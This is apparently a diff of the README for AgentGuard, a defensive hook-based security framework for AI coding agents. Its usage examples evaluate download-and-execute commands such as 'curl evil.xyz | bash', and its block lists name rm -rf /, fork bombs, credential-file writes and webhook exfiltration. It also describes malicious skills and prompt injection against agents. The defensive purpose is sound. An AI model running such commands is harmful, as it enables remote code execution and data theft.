@@ -1,47 +1,83 @@
 <p align="center">
-  <img src="assets/logo.svg" alt="FFWD AgentGuard" width="120" />
+  <img src="assets/ffwd-logo.svg" alt="FFWD AgentGuard" width="120" />
 </p>
 
 <h1 align="center">FFWD AgentGuard</h1>
 
-<p align="center"><b>The essential security guard for every AI agent user.</b></p>
+<p align="center"><b>Security framework for AI agents.</b></p>
 
 <p align="center">Your AI agent has full access to your terminal, files, and secrets — but zero security awareness.<br/>A malicious skill or prompt injection can steal your keys or wipe your disk.<br/><b>AgentGuard stops all of that.</b></p>
 
 [![npm](https://img.shields.io/npm/v/@core0-io/ffwd-agent-guard.svg)](https://www.npmjs.com/package/@core0-io/ffwd-agent-guard)
 [![GitHub Stars](https://img.shields.io/github/stars/core0-io/ffwd-agent-guard)](https://github.com/core0-io/ffwd-agent-guard)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
 [![CI](https://github.com/core0-io/ffwd-agent-guard/actions/workflows/ci.yml/badge.svg)](https://github.com/core0-io/ffwd-agent-guard/actions/workflows/ci.yml)
 [![Agent Skills](https://img.shields.io/badge/Agent_Skills-compatible-purple.svg)](https://agentskills.io)
 
-## Why AgentGuard?
+## Architecture
 
-AI coding agents can execute any command, read any file, and install any skill — with zero security review. The risks are real:
+AgentGuard is a **two-pipeline** security framework:
 
-- **Malicious skills** can hide backdoors, steal credentials, or exfiltrate data
-- **Prompt injection** can trick your agent into running destructive commands
-- **Unverified code** from the internet may contain backdoors or keyloggers
+1. **Static Scan** — On-demand multi-engine code analysis (Static + Behavioral + LLM)
+2. **Dynamic Guard** — Real-time 6-phase RuntimeAnalyzer pipeline on every hook event
 
-**AgentGuard is the first real-time security layer for AI agents.** It automatically scans every new skill, blocks dangerous actions before they execute, runs daily security patrols, and tracks which skill initiated each action. One install, always protected.
+```
+┌──────────────────────────────────────────────────────────┐
+│ Static Scan (on-demand)                                  │
+│   /ffwd-agent-guard scan <path>                          │
+│   → ScanOrchestrator → Static + Behavioral + LLM        │
+│   → Finding[] → ScanResult                               │
+└──────────────────────────────────────────────────────────┘
 
-## What It Does
+┌──────────────────────────────────────────────────────────┐
+│ Dynamic Guard (real-time, every PreToolUse hook)         │
+│   guard-hook → evaluateHook() → RuntimeAnalyzer          │
+│   → 6-phase pipeline → allow / deny / confirm            │
+└──────────────────────────────────────────────────────────┘
+```
 
-**Layer 1 — Automatic Guard (hooks)**: Install once, always protected.
-- Blocks `rm -rf /`, fork bombs, `curl | bash` and destructive commands
-- Prevents writes to `.env`, `.ssh/`, credentials files
-- Detects data exfiltration to Discord/Telegram/Slack webhooks
-- Tracks which skill initiated each action — holds malicious skills accountable
+### Dynamic Guard: 6-Phase Pipeline
 
-**Layer 2 — Deep Scan (skill)**: On-demand security audit with 16 detection rules.
-- **Auto-scans new skills** on session start — malicious code blocked before it runs
-- Static analysis for secrets, backdoors, obfuscation, and prompt injection
-- Trust registry with capability-based access control per skill
+Every `PreToolUse` hook event flows through the RuntimeAnalyzer. Each phase produces a 0–1 score and can short-circuit on critical findings.
 
-**Layer 3 — Daily Patrol (OpenClaw)**: Automated daily security posture assessment.
-- 8 comprehensive security checks run on a configurable schedule
-- Detects skill tampering, secrets exposure, network risks, and suspicious file changes
-- Analyzes audit logs for attack patterns and flags repeat offenders
-- Validates environment configuration and trust registry health
+| Phase | Name | Latency | Applies To |
+|-------|------|---------|------------|
+| 1 | **Allowlist Gate** | <1ms | All actions |
+| 2 | **Pattern Analysis** | <5ms | All actions |
+| 3 | **Static Analysis** | <50ms | Write/Edit only |
+| 4 | **Behavioral Analysis** | <200ms | Write/Edit (.js/.ts/.py/.sh/.rb/.php/.go) |
+| 5 | **LLM Analysis** | 2–10s | All (optional, needs `llm.api_key`) |
+| 6 | **External Scoring API** | configurable | All (optional, needs `guard.scoring_endpoint`) |
+
+Phases 3–4 only run when file content is available (Write/Edit actions). Phases 5–6 are opt-in via config.
+
+After all phases run, scores are combined via **weighted average**:
+
+```
+final = Σ(weight × score) / Σ(weight)
+```
+
+Default weights: `runtime: 1.0`, `static: 1.0`, `behavioral: 2.0`, `llm: 1.0`, `external: 2.0`
+
+### Multi-Language Behavioral Analysis
+
+Phase 4 uses pluggable `LanguageExtractor` modules for source→sink dataflow tracking:
+
+| Language | Parser | Extensions |
+|----------|--------|------------|
+| JavaScript/TypeScript | Babel AST | .js .ts .jsx .tsx .mjs .cjs |
+| Python | Regex | .py .pyw |
+| Shell | Regex | .sh .bash .zsh .fish .ksh |
+| Ruby | Regex | .rb .rake .gemspec |
+| PHP | Regex | .php .phtml |
+| Go | Regex | .go |
+
+### Protection Levels
+
+| Level | allow | confirm | deny |
+|-------|-------|---------|------|
+| **strict** | 0 — 0.5 | _(none)_ | 0.5 — 1.0 |
+| **balanced** (default) | 0 — 0.5 | 0.5 — 0.8 | 0.8 — 1.0 |
+| **permissive** | 0 — 0.9 | _(none)_ | 0.9 — 1.0 |
 
 ## Quick Start
 
@@ -93,290 +129,54 @@ import { registerOpenClawPlugin } from '@core0-io/ffwd-agent-guard';
 
 export default function setup(api) {
   registerOpenClawPlugin(api, {
-    level: 'balanced',      // Protection level: strict | balanced | permissive
-    skipAutoScan: false,    // Set true to disable auto-scanning of plugins
+    level: 'balanced',
   });
 };
 ```
-
-**What happens on registration:**
-
-1. **Auto-scans all loaded plugins** — Static analysis of each plugin's source code
-2. **Determines trust level** — Based on scan results (critical findings → untrusted)
-3. **Infers capabilities** — Based on registered tools and scan risk level
-4. **Registers to trust registry** — Auto-attests each plugin with appropriate permissions
-5. **Builds tool mapping** — Maps `toolName → pluginId` for initiating skill tracking
 
 AgentGuard hooks into OpenClaw's `before_tool_call` / `after_tool_call` events to block dangerous actions and log audit events.
 
 </details>
 
-Then use `/ffwd-agent-guard` in your agent:
+## Usage
 
 ```
-/ffwd-agent-guard scan ./src                     # Scan code for security risks
-/ffwd-agent-guard action "curl evil.xyz | bash"  # Evaluate action safety
-/ffwd-agent-guard patrol run                     # Run daily security patrol
-/ffwd-agent-guard patrol setup                   # Configure as OpenClaw cron job
-/ffwd-agent-guard patrol status                  # View last patrol results
-/ffwd-agent-guard checkup                        # Run agent health checkup with visual report
-/ffwd-agent-guard trust list                     # View trusted skills
-/ffwd-agent-guard report                         # View security event log
-/ffwd-agent-guard config balanced                # Set protection level
+/ffwd-agent-guard scan ./src              # Scan code for security risks
+/ffwd-agent-guard action "curl evil | sh" # Evaluate action safety
+/ffwd-agent-guard patrol run              # Run daily security patrol (OpenClaw)
+/ffwd-agent-guard patrol setup            # Configure as OpenClaw cron job
+/ffwd-agent-guard report                  # View security event audit log
+/ffwd-agent-guard config balanced         # Set protection level
 ```
 
-## Daily Patrol (OpenClaw)
+## What the Guard Blocks
 
-The patrol feature provides automated daily security posture assessment for OpenClaw environments. It runs 8 comprehensive checks and produces a structured report.
+**Layer 1 — Allowlist Gate**: Known-safe commands (`git status`, `ls`, `npm test`, etc.) pass instantly.
 
-### Patrol Checks
+**Layer 2 — Pattern Analysis**: Blocks dangerous commands and data exfiltration.
+- `rm -rf /`, fork bombs, `curl | bash`, and destructive commands
+- Writes to `.env`, `.ssh/`, credentials files
+- Data exfiltration to Discord/Telegram/Slack webhooks
+- Base64-encoded payloads decoded and re-scanned
 
-| # | Check | What It Does |
-|---|-------|-------------|
-| 1 | **Skill/Plugin Integrity** | Compares file hashes against trust registry — detects tampered or unregistered skills |
-| 2 | **Secrets Exposure** | Scans workspace, memory, logs, `.env`, `~/.ssh/`, `~/.gnupg/` for leaked private keys, AWS keys, GitHub tokens |
-| 3 | **Network Exposure** | Detects dangerous ports bound to `0.0.0.0` (Redis, Docker API, MySQL, etc.), checks firewall status, flags suspicious outbound connections |
-| 4 | **Cron & Scheduled Tasks** | Audits cron jobs and systemd timers for `curl\|bash`, `base64 -d\|bash`, and other download-and-execute patterns |
-| 5 | **File System Changes (24h)** | Finds recently modified files, runs 16-rule scan on them, checks permissions on critical files, detects new executables |
-| 6 | **Audit Log Analysis (24h)** | Flags skills denied 3+ times, CRITICAL events, exfiltration attempts, and prompt injection detections |
-| 7 | **Environment & Configuration** | Verifies protection level, validates config baseline integrity |
-| 8 | **Trust Registry Health** | Flags expired attestations, stale trusted skills (30+ days), installed-but-untrusted skills, over-privileged entries |
+**Layer 3 — Static + Behavioral Analysis** (Write/Edit only):
+- 16 regex rules on file content (SHELL_EXEC, OBFUSCATION, PROMPT_INJECTION, etc.)
+- Source→sink dataflow tracking across 6 languages
+- Detects env→network exfiltration, network→eval RCE, capability combinations (C2)
 
-### Usage
-
-```bash
-# Run all 8 checks now
-/ffwd-agent-guard patrol run
-
-# Set up as a daily cron job (default: 03:00 UTC)
-/ffwd-agent-guard patrol setup
-
-# Check last patrol results and cron schedule
-/ffwd-agent-guard patrol status
-```
-
-### Patrol Report
-
-Each patrol produces a report with an overall status:
-
-| Status | Meaning |
-|--------|---------|
-| **PASS** | Only low/medium findings |
-| **WARN** | HIGH severity findings detected |
-| **FAIL** | CRITICAL severity findings detected |
-
-Reports include per-check status, finding counts, detailed findings for checks with issues, and actionable recommendations. Results are also logged to `~/.ffwd-agent-guard/audit.jsonl`.
-
-### Setup Options
-
-`patrol setup` configures an OpenClaw cron job with:
-- **Timezone** — defaults to UTC
-- **Schedule** — defaults to `0 3 * * *` (daily at 03:00)
-- **Notifications** — optional Telegram, Discord, or Signal alerts
-
-> **Note:** Patrol requires an OpenClaw environment. For non-OpenClaw setups, use `/ffwd-agent-guard scan` and `/ffwd-agent-guard report` for manual security checks.
-
-## Agent Health Checkup 🦞
-
-Give your agent a full physical exam! The checkup evaluates your agent's security posture across 5 dimensions and generates a beautiful visual HTML report — complete with a lobster mascot whose appearance reflects your agent's health.
-
-```
-/ffwd-agent-guard checkup
-```
-
-### What It Checks
-
-| Dimension | What's Evaluated |
-|-----------|-----------------|
-| **Code Safety** | Scan findings across all installed skills (16 detection rules) |
-| **Trust Hygiene** | Trust registry health — expired, stale, unregistered, over-privileged entries |
-| **Runtime Defense** | Audit log analysis — threats blocked, attack patterns, deny/confirm ratios |
-| **Secret Protection** | Credential exposure — file permissions, env vars, hardcoded secrets |
-| **Config Posture** | Protection level, guard hooks, auto-scan, patrol history |
-
-### The Lobster Scale
-
-Your agent's health is visualized by a lobster mascot:
-
-| Score | Tier | Lobster | Message |
-|-------|------|---------|---------|
-| 90–100 | **S** | 💪 Muscular bodybuilder with crown & sunglasses | *"Your agent is JACKED!"* |
-| 70–89 | **A** | 🛡️ Healthy lobster with shield | *"Looking solid!"* |
-| 50–69 | **B** | ☕ Tired lobster with coffee, sweating | *"Needs a workout..."* |
-| 0–49 | **F** | 🚨 Sick lobster with bandages & thermometer | *"CRITICAL CONDITION!"* |
-
-The report is a self-contained HTML file that opens automatically in your browser. Dark theme, animated score gauge, expandable findings, and actionable recommendations.
-
-## Protection Levels
-
-| Level | Behavior |
-|-------|----------|
-| `strict` | Block all risky actions. Every dangerous or suspicious command is denied. |
-| `balanced` | Block dangerous, confirm risky. Good for daily use. **(default)** |
-| `permissive` | Only block critical threats. For experienced users who want minimal friction. |
+**Layer 4 — LLM + External** (optional):
+- Claude semantic analysis catches sophisticated attacks missed by regex/AST
+- External HTTP scoring API for custom enterprise policies
 
 ## Detection Rules (16)
 
 | Category | Rules | Severity |
 |----------|-------|----------|
-| **Execution** | SHELL_EXEC, AUTO_UPDATE, REMOTE_LOADER | HIGH-CRITICAL |
-| **Secrets** | READ_ENV_SECRETS, READ_SSH_KEYS, READ_KEYCHAIN, PRIVATE_KEY_PATTERN | MEDIUM-CRITICAL |
-| **Exfiltration** | NET_EXFIL_UNRESTRICTED, WEBHOOK_EXFIL | HIGH-CRITICAL |
-| **Obfuscation** | OBFUSCATION, PROMPT_INJECTION | HIGH-CRITICAL |
-| **Trojan & Social Engineering** | TROJAN_DISTRIBUTION, SUSPICIOUS_PASTE_URL, SUSPICIOUS_IP, SOCIAL_ENGINEERING | MEDIUM-CRITICAL |
-
-## Try It
-
-Scan the included vulnerable demo project:
-
-```
-/ffwd-agent-guard scan examples/vulnerable-skill
-```
-
-Expected output: **CRITICAL** risk level with detection hits across JavaScript, Solidity, and Markdown files.
-
-## Compatibility
-
-FFWD AgentGuard follows the [Agent Skills](https://agentskills.io) open standard:
-
-| Platform | Support | Features |
-|----------|---------|----------|
-| **Claude Code** | Full | Skill + hooks auto-guard, transcript-based skill tracking |
-| **OpenClaw** | Full | Plugin hooks + **auto-scan on load** + tool→plugin mapping + **daily patrol** |
-| **OpenAI Codex CLI** | Skill | Scan/action/trust commands |
-| **Gemini CLI** | Skill | Scan/action/trust commands |
-| **Cursor** | Skill | Scan/action/trust commands |
-| **GitHub Copilot** | Skill | Scan/action/trust commands |
-
-> **Hooks-based auto-guard (Layer 1)** works on Claude Code (PreToolUse/PostToolUse) and OpenClaw (before_tool_call/after_tool_call). Both platforms share the same decision engine via a unified adapter abstraction layer.
->
-> **OpenClaw exclusive**: Auto-scans all loaded plugins at registration time, automatically registers them to the trust registry, and supports automated daily security patrols via cron.
-
-## Hook Limitations
-
-The auto-guard hooks (Layer 1) have the following constraints:
-
-- **Platform-specific**: Hooks rely on Claude Code's `PreToolUse` / `PostToolUse` events or OpenClaw's `before_tool_call` / `after_tool_call` plugin hooks. Both share the same decision engine via the adapter abstraction layer.
-- **Default-deny policy**: First-time use may trigger confirmation prompts for certain commands. A built-in safe-command allowlist (`ls`, `echo`, `pwd`, `git status`, etc.) reduces false positives.
-- **Skill source tracking**:
-  - *Claude Code*: Infers which skill initiated an action by analyzing the conversation transcript (heuristic, not 100% precise)
-  - *OpenClaw*: Uses tool→plugin mapping built at registration time (more reliable)
-- **Cannot intercept skill installation itself**: Hooks can only intercept tool calls (Bash, Write, WebFetch, etc.) that a skill makes *after* loading — they cannot block the Skill tool invocation itself.
-- **OpenClaw auto-scan timing**: Plugins are scanned asynchronously after AgentGuard registration completes. Very fast tool calls immediately after startup may execute before scan completes.
-
-## Roadmap
-
-### v1.1 — Detection Enhancement
-- [x] Extend scanner rules to Markdown files (detect malicious SKILL.md)
-- [x] Base64 payload decoding and re-scanning
-- [x] New rules: TROJAN_DISTRIBUTION, SUSPICIOUS_PASTE_URL, SUSPICIOUS_IP, SOCIAL_ENGINEERING
-- [x] Safe-command allowlist to reduce hook false positives
-- [x] Plugin manifest (`.claude-plugin/`) for one-step install
-
-### v1.5 — Daily Patrol
-- [x] `patrol run` — 8-check security posture assessment
-- [x] `patrol setup` — OpenClaw cron job configuration with timezone and notifications
-- [x] `patrol status` — Last results and schedule overview
-- [x] Skill/plugin integrity verification (hash drift detection)
-- [x] Secrets exposure scanning (private keys, AWS keys, GitHub tokens)
-- [x] Network exposure and firewall checks
-- [x] Audit log pattern analysis (repeat denials, exfiltration attempts)
-
-### v1.6 — Agent Health Checkup
-- [x] `checkup` — 5-dimension security health assessment
-- [x] Visual HTML report with lobster mascot (4 tiers)
-- [x] Animated score gauge, dimension cards, expandable findings
-- [x] Scoring algorithm: Code Safety, Trust Hygiene, Runtime Defense, Secret Protection, Config Posture
-- [x] Premium upgrade CTA integration
-
-### v2.0 — Multi-Platform
-- [x] OpenClaw gateway plugin integration
-- [x] `before_tool_call` / `after_tool_call` hook wiring
-- [x] Multi-platform adapter abstraction layer (Claude Code + OpenClaw)
-- [x] Auto-scan plugins on OpenClaw registration
-- [x] Tool→plugin mapping for initiating skill tracking
-- [x] Auto-register scanned plugins to trust registry
-- [ ] OpenAI Codex CLI sandbox adapter
-- [ ] Federated trust registry across platforms
-
-### v3.0 — Ecosystem
-- [ ] Threat intelligence feed (shared C2 IP/domain blocklist)
-- [ ] Skill marketplace automated scanning pipeline
-- [ ] VS Code extension for IDE-native security
-- [ ] Community rule contributions (open rule format)
-
-## OpenClaw Integration
-
-AgentGuard provides deep integration with OpenClaw through automatic plugin scanning, trust management, and daily security patrols.
-
-<details>
-<summary><b>How it works</b></summary>
-
-When AgentGuard registers as an OpenClaw plugin:
-
-```
-┌─────────────────────────────────────────────────────────────────┐
-│  OpenClaw loads AgentGuard plugin                               │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│  AgentGuard scans all loaded plugins (async, non-blocking)      │
-│  • Reads plugin source from registry                            │
-│  • Runs 16 static analysis rules                                │
-│  • Calculates artifact hash                                     │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│  For each plugin:                                               │
-│  • Determine trust level (untrusted/restricted/trusted)         │
-│  • Infer capabilities from tools + scan results                 │
-│  • Register to AgentGuard trust registry                        │
-│  • Map tool names → plugin ID                                   │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│  On every tool call:                                            │
-│  • Look up plugin from tool name                                │
-│  • Check plugin trust level & capabilities                      │
-│  • Evaluate action against security policies                    │
-│  • Allow / Deny / Log                                           │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│  Daily patrol (via cron):                                       │
-│  • Run 8 security checks against the environment                │
-│  • Verify skill integrity, detect secrets, audit logs           │
-│  • Generate report (PASS / WARN / FAIL)                         │
-│  • Send notifications (Telegram / Discord / Signal)             │
-└─────────────────────────────────────────────────────────────────┘
-```
-
-</details>
-
-<details>
-<summary><b>Exported utilities for OpenClaw</b></summary>
-
-```typescript
-import {
-  registerOpenClawPlugin,
-  getPluginIdFromTool,
-  getPluginScanResult,
-} from '@core0-io/ffwd-agent-guard';
-
-// Get which plugin registered a tool
-const pluginId = getPluginIdFromTool('browser');
-// → 'my-browser-plugin'
-
-// Get cached scan result
-const scanResult = getPluginScanResult('my-browser-plugin');
-// → { riskLevel: 'low', riskTags: [] }
-```
-
-</details>
+| **Execution** | SHELL_EXEC, AUTO_UPDATE, REMOTE_LOADER | HIGH–CRITICAL |
+| **Secrets** | READ_ENV_SECRETS, READ_SSH_KEYS, READ_KEYCHAIN, PRIVATE_KEY_PATTERN | MEDIUM–CRITICAL |
+| **Exfiltration** | NET_EXFIL_UNRESTRICTED, WEBHOOK_EXFIL | HIGH–CRITICAL |
+| **Obfuscation** | OBFUSCATION, PROMPT_INJECTION | HIGH–CRITICAL |
+| **Trojan & Social Engineering** | TROJAN_DISTRIBUTION, SUSPICIOUS_PASTE_URL, SUSPICIOUS_IP, SOCIAL_ENGINEERING | MEDIUM–CRITICAL |
 
 ## Telemetry (OTEL Collector)
 
@@ -384,62 +184,44 @@ AgentGuard captures agent activity as OpenTelemetry metrics and traces via an as
 
 ### Metrics
 
-| Metric                      | Type    | Labels                        | Description                                                                        |
-|-----------------------------|---------|-------------------------------|------------------------------------------------------------------------------------|
-| `agentguard.tool_use.count` | Counter | `tool_name`, `event`, `platform` | Tool invocations captured (PreToolUse / PostToolUse / TaskCreated / TaskCompleted) |
-| `agentguard.turn.count`     | Counter | `platform`                    | Conversation turns completed (Stop / SubagentStop events)                          |
-
-**Metric labels:**
-
-| Label                    | Values                                                      | Description                                          |
-|--------------------------|-------------------------------------------------------------|------------------------------------------------------|
-| `agentguard.tool_name`   | `Bash`, `Write`, `Edit`, `WebFetch`, `WebSearch`, `Task`, … | Name of the tool or `Task` for task events           |
-| `agentguard.event`       | `PreToolUse`, `PostToolUse`, `TaskCreated`, `TaskCompleted` | Hook event that triggered the record                 |
-| `agentguard.platform`    | e.g. `claude-code`                                          | Runtime platform passed via `--platform`             |
+| Metric | Type | Labels |
+|--------|------|--------|
+| `agentguard.tool_use.count` | Counter | `tool_name`, `event`, `platform` |
+| `agentguard.turn.count` | Counter | `platform` |
 
 ### Traces
 
-One OTEL trace per conversation turn. Spans are emitted as children of the turn root.
+One OTEL trace per conversation turn:
 
-| Span name      | Trigger                          | Attributes                                                              |
-|----------------|----------------------------------|-------------------------------------------------------------------------|
-| `turn:<N>`     | `Stop` / `SubagentStop`          | `session_id`, `turn_number`, `platform`, `cwd`                          |
-| `tool:<name>`  | `PreToolUse` → `PostToolUse`     | `tool_name`, `tool_summary`, `session_id`, `turn_number`, `platform`, `cwd` |
-| `task:execute` | `TaskCreated` → `TaskCompleted`  | `task_id`, `task_summary`, `session_id`, `turn_number`, `platform`, `cwd`   |
+| Span | Trigger | Attributes |
+|------|---------|------------|
+| `turn:<N>` | `Stop` / `SubagentStop` | `session_id`, `turn_number`, `platform`, `cwd` |
+| `tool:<name>` | `PreToolUse` → `PostToolUse` | `tool_name`, `tool_summary`, `session_id` |
+| `task:execute` | `TaskCreated` → `TaskCompleted` | `task_id`, `task_summary`, `session_id` |
 
-**Span attributes:**
+## Compatibility
 
-| Attribute                    | Description                                                        |
-|------------------------------|--------------------------------------------------------------------|
-| `agentguard.session_id`      | Claude Code session identifier                                     |
-| `agentguard.turn_number`     | Monotonically increasing turn counter within the session           |
-| `agentguard.platform`        | Runtime platform                                                   |
-| `agentguard.cwd`             | Working directory at time of event                                 |
-| `agentguard.tool_name`       | Tool name (tool spans only)                                        |
-| `agentguard.tool_summary`    | First 300 chars of tool input (command, file path, URL, etc.)      |
-| `agentguard.task_id`         | Task identifier from `TaskCreated` payload                         |
-| `agentguard.task_summary`    | First 300 chars of task prompt                                     |
-
-### Hook events captured
-
-| Hook event      | Data captured                                                                              |
-|-----------------|--------------------------------------------------------------------------------------------|
-| `PreToolUse`    | `session_id`, `tool_name`, `tool_use_id`, `tool_input`, `cwd`, `transcript_path`          |
-| `PostToolUse`   | `session_id`, `tool_name`, `tool_use_id`, `tool_response` (`output`, `error`, `interrupted`), `cwd` |
-| `TaskCreated`   | `session_id`, `task_id`, `task_input.prompt`, `cwd`, `transcript_path`                    |
-| `TaskCompleted` | `session_id`, `task_id`, `task_output`, `cwd`                                              |
-| `Stop`          | `session_id`, `stop_reason`, `cwd`                                                         |
-| `SubagentStop`  | `session_id`, `stop_reason`, `cwd`                                                         |
+| Platform | Support | Features |
+|----------|---------|----------|
+| **Claude Code** | Full | Skill + hooks auto-guard |
+| **OpenClaw** | Full | Plugin hooks + daily patrol |
+| **OpenAI Codex CLI** | Skill | Scan/action commands |
+| **Gemini CLI** | Skill | Scan/action commands |
+| **Cursor** | Skill | Scan/action commands |
+| **GitHub Copilot** | Skill | Scan/action commands |
 
 ## Documentation
 
+- [Architecture](docs/architecture.md) — Two-pipeline design, 6-phase guard flow, scoring system
+- [Dynamic Guard Flow](docs/dynamic-guard-flow.excalidraw) — Visual Excalidraw diagram
 - [Security Policy](docs/SECURITY-POLICY.md) — Unified security rules and policies reference
-- [Architecture](docs/architecture.md) — Project structure, pipelines, and testing
 
-## Contributing
+## Development
 
-Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+```bash
+npm install
+npm run build
+npm test          # 370 tests
+```
 
-Found a security vulnerability? See [SECURITY.md](SECURITY.md).
-
-Maintained by [core0-io](https://github.com/core0-io). Upstream: [GoPlus AgentGuard](https://github.com/GoPlusSecurity/agentguard) · [GoPlus Security](https://gopluslabs.io).
+Maintained by [core0-io](https://github.com/core0-io).
